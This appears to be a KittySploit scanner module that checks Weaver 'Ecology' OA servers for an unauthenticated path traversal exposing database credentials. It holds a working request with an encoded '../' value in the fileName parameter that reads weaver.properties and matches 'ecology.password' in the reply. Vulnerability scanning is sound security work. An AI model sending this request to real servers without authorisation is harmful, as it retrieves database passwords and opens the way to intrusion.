#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The "ecology" component exposes a file that contains sensitive database credentials (dbuser/dbpass)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ecology - Information Exposure Detection',
        'description': 'The "ecology" component exposes a file that contains sensitive database credentials (dbuser/dbpass).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'misconfiguration', 'ecology', 'unauth', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/xinyisleep/pocscan/blob/main/%E6%B3%9B%E5%BE%AE/oa%E6%B3%9B%E5%BE%AE0day%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.py',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('ecology.password', 'ecology.charset',)
        header_any = ('text/plain',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Ecology - Information Exposure detected",
                path='/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties',
            )
            return True
        return False

